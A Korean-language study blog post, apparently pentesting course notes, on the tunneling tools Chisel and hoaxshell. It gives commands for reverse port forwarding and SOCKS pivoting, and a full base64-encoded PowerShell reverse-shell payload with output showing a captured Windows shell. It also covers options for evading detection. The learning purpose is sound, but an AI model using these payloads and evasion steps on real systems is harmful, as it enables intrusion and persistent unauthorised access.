---
title:  "Tunneling Tools"
excerpt: "터널링 관련 도구들에 대해 알아보자."

categories: pnt
tags:
  - [pivoting, tunneling, penetrate, penetration, 'post-exploit', 'port fowarding', hoaxshell, chisel]

typora-root-url: ../../
 
date: 2025-09-12
last_modified_at: 2025-09-12


---

**☀️<u>공지 사항</u>☀️** 해당 페이지는 `Red Raccoon - PNT` 학습 후 추가적인 개인 공부를 통해 재구성 및 실습한 내용입니다. 필자의 환경에 맞게 공부 및 실습을 진행하여 이 점 참고 바랍니다. [Red Raccoon - PNT 강의 사이트로 이동하기](https://www.inflearn.com/course/pnt-%ED%94%BC%EB%B2%84%ED%8C%85-%ED%84%B0%EB%84%90%EB%A7%81)
{: .notice--danger}


## Chisel
### 개요
Chisel은 네트워크 터널링과 피버팅에 사용하는 오픈소스 터널링 툴이다. 주로 펜테스팅이나 리버스 터널링에 많이 쓰이며, HTTP(S) 프로토콜을 이용해 **방화벽을 우회하고 내부 네트워크에 접근하는 데 활용**된다.

기능적인 면에서 보자면 Chisel은 앞서 살펴봤던 SSH와 같은 기능을 가지고 있다. SSH와 마찬가지로 다양한 종류의 포트 포워딩과 다이나믹 포트 포워딩을 통한 SOCKS 프록시 구축이 가능하다. 

Chisel은 호스트들에 **SSH가 설치가 안되어 있거나, 설치가 불가한 경우, 그리고 인바운드/아웃바운드 트래픽 중 SSH 트래픽이 막혀 있는 경우** 대체제로서 사용될 수 있다.

Chisel의 핵심은 **TCP/UDP 터널을 구축**하고, **터널 속 트래픽을 HTTP를 통해 전달**하며, **SSH를 통해 암호화**까지 챙기는 것 으로 볼 수 있다. 

### 특징 및 역할
- Go 언어로 작성된 가볍고 빠른 TCP/UDP 터널링 툴
- **HTTP 프로토콜 위에서 SSH와 암호화를 사용**해 보안성 강화
- 서버-클라이언트 구조로 동작하며, 리버스 포트 포워딩 및 **SOCKS5 프록시 지원**
- **방화벽이나 NAT 뒤에 숨어있는 내부망을 안전하게 우회하여 접속** 가능
- Metasploit, Cobalt Strike 등 해킹 툴과 함께 사용하며 피버팅 및 터널링에 자주 활용됨

### 사용 시나리오
- 내부망의 특정 포트나 서비스를 외부 공격자가 접근하도록 터널 생성
- SSH 트래픽이 방화벽에 막혀 직접 접속 불가한 환경에서 우회 통신 통로 확보
- 페이로드 실행 후 안전한 리버스 터널을 만들어 내부망에서 다른 시스템으로 lateral movement 수행
- 작전 보안을 위해 HTTP 트래픽처럼 보여야 할 때


> 칼리 리눅스에서는 보통 공격자의 서버 역할을 하고, 내부망에 침투한 호스트에 클라이언트를 설치해 리버스 터널을 만드는 방식으로 사용한다. 방화벽/네트워크 정책 우회에도 매우 유용하다

### 설치 및 설정
[chisel github repo] : https://github.com/jpillora/chisel

```sh
# go languege 설치
sudo apt update -y 
sudo apt install golang-go -y

# chisel 설치 및 리눅스 용 빌드
git clone https://github.com/jpillora/chisel.git
cd chisel && go build

# windows 용 chisel 빌드 방법
┌──(kali㉿kali)-[~/Desktop/PNT/chisel]
└─$ GOARCH=amd64 GOOS=windows go build -o chisel.exe  

└─$ ll
total 29488
-rwxrwxr-x 1 kali kali 14914517 Sep 12 13:39 chisel
-rwxrwxr-x 1 kali kali 15202816 Sep 12 13:43 chisel.exe

# 피벗 호스트로 파일 옮기기
sudo scp chisel [피벗호스트계정@아이피:파일경로]
```

ProxyChains4 config 파일 설정
```sh
└─$ sudo vi /etc/proxychains4.conf 
...
[ProxyList]
socks5 127.0.0.1 8080		//프록시 포트 지정
```

### 기본 사용법
1. Chisel 서버 실행하기 (칼리 리눅스에서는 주로 서버 역할)
```sh
sudo chisel server -p 8080 --reverse
```
- `-p 8080` : 8080 포트에서 터널 서버를 대기시킴
- `--reverse` : 리버스 터널링 활성화 (클라이언트가 서버 쪽으로 터널 생성 가능)

2. 클라이언트 실행하기 (내부망에 침투한 대상 시스템)
내부 Windows나 Linux 시스템에서 클라이언트를 실행하여 칼리 서버로 리버스 터널을 만든다.
```sh
chisel client 공격자_IP:8080 R:3389:127.0.0.1:3389
```
- 리버스 포트포워딩으로 칼리 서버에서 내부 포트 3389(RDP)에 접근 가능
- Windows RDP나 기타 내부서비스 우회 탐색에 사용

3. SOCKS5 프록시 사용(내부망 탐색 확장)
칼리 서버에서 SOCKS5 프록시를 활성화하면서 서버 실행
```sh
sudo chisel server -p 8080 --reverse --socks5
```

내부 시스템에서 클라이언트 실행
```sh
chisel client 공격자_IP:8080 R:socks
```

이후 칼리에서 `proxychains` 같은 툴을 이용해 내부망 접속 및 탐색 가능

### 요약 명령어

| 역할 | 명령어 예시 | 설명 |
|-------|--------------|-------|
| 서버 실행 | `sudo chisel server -p 8080 --reverse` | 리버스 터널링용 서버 대기 |
| 클라이언트 실행 | `chisel client 공격자_IP:8080 R:3389:127.0.0.1:3389` | 침투지 터널 연결 및 포트포워딩 |
| SOCKS5 프록시 서버 실행 | `sudo chisel server -p 8080 --reverse --socks5` | 내부망 탐색용 프록시 터널링 |
| SOCKS5 클라이언트 연결 | `chisel client 공격자_IP:8080 R:socks` | SOCKS 프록시 연결 요청 |


## hoaxshell
### 개요
HoaxShell은 HTTP/S 트래픽을 활용해 윈도우 대상 기기에서 탐지 회피 가능한 리버스 셸 세션을 생성하는 강력한 침투 테스트용 도구이다. 다양한 페이로드 옵션과 외부 터널링 서비스 연동으로 유연하게 사용 가능하며, 네트워크 방화벽 우회 및 내부망 접근 등에 특히 효과적이다.

- PowerShell 기반 페이로드를 자동으로 생성하고 관리
- HTTP/HTTPS 트래픽에 섞여 통신하여 보안 솔루션 탐지를 우회하도록 설계
- 실제 PTY(터미널) 세션과 달리 쉘 세션을 가장하는 방식으로 실행
- AV 탐지를 피하기 위해 생성 페이로드의 세션 ID, URL 경로, HTTP 헤더 이름을 매 실행마다 무작위로 변경
- 페이로드 암호화 및 난독화 가능
- Kali 및 윈도우 환경에서 활용하는 침투 테스트용 툴

### 주요 특징
- HTTP/S 리버스 셸: 표준 웹 트래픽처럼 포트 80/443을 사용하는 터널 세션을 생성
- 페이로드 자동 생성: 권장하는 PowerShell 스크립트를 자동 생성해 대상에 주입
- 다양한 페이로드 옵션: 기본 Invoke-Expression 방식, 파일 기반 실행 방식, HTTPS 암호화, 인증 헤더 커스터마이징 가능
- 세션 복구 기능: 세션 ID 유지 및 복구 기능 지원
- Constraint Language 지원: 제한된 PowerShell 환경에서도 동작 가능하게 페이로드 생성
- Ngrok, LocalTunnel 등 외부 터널링 서비스 연동 가능
- 터널링을 통한 네트워크 우회용 도구로 활용 가능

### 설치
github repo : https://github.com/t3l3machus/hoaxshell
```sh
┌──(kali㉿kali)-[~/Desktop/PNT/hoaxshell/
└─$ git clone https://github.com/t3l3machus/hoaxshell
└─$ cd ./hoaxshell

┌──(kali㉿kali)-[~/Desktop/PNT/hoaxshell/hoaxshell]
└─$ python3 -m venv ~/venv
┌──(kali㉿kali)-[~/Desktop/PNT/hoaxshell/hoaxshell]
└─$ source ~/venv/bin/activate

┌──(venv)─(kali㉿kali)-[~/Desktop/PNT/hoaxshell/hoaxshell]
└─$ pip install -r requirements.txt  
┌──(venv)─(kali㉿kali)-[~/Desktop/PNT/hoaxshell/hoaxshell]
└─$ chmod +x hoaxshell.py
```

### 기본 사용법

#### 1. 기본 PowerShell 리버스 셸 페이로드 생성 및 서비스 시작

```bash
sudo python3 hoaxshell.py -s <공격자_IP> -p <공격자_PORT>
```

- `<공격자_IP>` : 공격자(리스너) 서버의 IP 주소
- `<공격자_PORT>` : 공격자(리스너) 서버의 PORT 주소
- 실행 시 페이로드 스크립트가 자동 생성되며, 실행 후 PowerShell 세션을 수립함

**실행 결과**
```bash
┌──(venv)─(kali㉿kali)-[~/Desktop/PNT/hoaxshell/hoaxshell]
└─$ python hoaxshell.py -s <공격자_IP> -p <공격자_PORT>

    ┬ ┬ ┌─┐ ┌─┐ ─┐ ┬ ┌─┐ ┬ ┬ ┌─┐ ┬   ┬  
    ├─┤ │ │ ├─┤ ┌┴┬┘ └─┐ ├─┤ ├┤  │   │  
    ┴ ┴ └─┘ ┴ ┴ ┴ └─ └─┘ ┴ ┴ └─┘ ┴─┘ ┴─┘
                           by t3l3machus

[Info] Generating reverse shell payload...
powershell -e JABzAD0AJwAxADAALgAxAC4AMgAwAC4AMQAwADoAMQAyADMANQAnADsAJABpAD0AJwAxAGQANwBmADgAYwBkADQALQBiADEANwBjADgAMAA2ADQALQBiA
DUANQA4ADAAYQBhADcAJwA7ACQAcAA9ACcAaAB0AHQAcAA6AC8ALwAnADsAJAB2AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEA
cwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AMQBkADcAZgA4AGMAZAA0ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtADgANQA1AGQALQB
iADIANQA4ACIAPQAkAGkAfQA7AHcAaABpAGwAZQAgACgAJAB0AHIAdQBlACkAewAkAGMAPQAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAG
UAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvAGIAMQA3AGMAOAAwADYANAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQA4ADUAN
QBkAC0AYgAyADUAOAAiAD0AJABpAH0AKQAuAEMAbwBuAHQAZQBuAHQAOwBpAGYAIAAoACQAYwAgAC0AbgBlACAAJwBOAG8AbgBlACcAKQAgAHsAJAByAD0AaQBlAHgAIAAk
AGMAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAdABvAHAAIAAtAEUAcgByAG8AcgBWAGEAcgBpAGEAYgBsAGUAIABlADsAJAByAD0ATwB1AHQALQBTAHQAcgBpAG4
AZwAgAC0ASQBuAHAAdQB0AE8AYgBqAGUAYwB0ACAAJAByADsAJAB0AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAcAAkAHMALw
BiADUANQA4ADAAYQBhADcAIAAtAE0AZQB0AGgAbwBkACAAUABPAFMAVAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQA4ADUANQBkAC0AYgAyADUAOAAiAD0AJABpA
H0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUA
KwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0A
Copied to clipboard!
[Info] Type "help" to get a list of the available prompt commands.
[Info] Http Server started on port <공격자_PORT>.
[Important] Awaiting payload execution to initiate shell session...
[Shell] Payload execution verified!
[Shell] Stabilizing command prompt...

PS C:\Users\rdpuser9 > whoami
ec2amaz-jsa0da9\rdpuser9
```

위 코드의 `powershell -e` 부분 부터 복사하여 타겟 윈도우의 파워쉘 창에서 실행시키면 쉘이 획득된다.


***

#### 2. 파일 기반 페이로드 생성

```bash
sudo python3 hoaxshell.py -s <공격자_IP> -x "C:\\Users\\$env:USERNAME\\.local\\hack.ps1"
```

- 지정한 경로에 스크립트를 작성해 실행하는 페이로드 생성

***

#### 3. HTTPS 사용 (자체 서명 인증서)

```bash
# 자체 서명 인증서 생성
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365

# HoaxShell 실행 시 인증서 적용
sudo python3 hoaxshell.py -s <공격자_IP> -c /path/to/cert.pem -k /path/to/key.pem
```

- HTTPS 트래픽으로 암호화하여 탐지 위험 감소

***

#### 4. 신뢰할 수 있는 인증서 사용 (도메인 필요)

```bash
sudo python3 hoaxshell.py -s your.domain.com -t -c /path/to/cert.pem -k /path/to/key.pem
```

- 실제 도메인과 공인 인증서 사용 시 더 탐지하기 어려운 페이로드 생성

***

#### 5. 세션 복구 모드

```bash
sudo python3 hoaxshell.py -s <공격자_IP> -g
```

- 세션이 끊겼을 때 재접속을 시도해 기존 세션 복구

***

#### 6. Constraint Language 모드 지원

```bash
sudo python3 hoaxshell.py -s <공격자_IP> -cm
```

- 제한된 PowerShell 환경에서 동작하도록 조정된 페이로드 생성

***

#### 7. 외부 터널링 도구 연동

- Ngrok 사용:

```bash
sudo python3 hoaxshell.py -ng
```

- LocalTunnel 사용:

```bash
sudo python3 hoaxshell.py -lt
```

- 포트 포워딩이 어려운 환경에서 세션 확보 가능

***

#### 주의사항 및 제한점

- 대화형 명령(예: `powershell`, `cmd.exe` 실행)은 쉘이 멈출 수 있음  
- 페이로드는 주로 비콘 형태의 비대화형 쉘 세션임  
- 탐지를 회피하려면 페이로드를 수시로 난독화하거나 커스터마이징 필요  

***


## Ligolo-ng










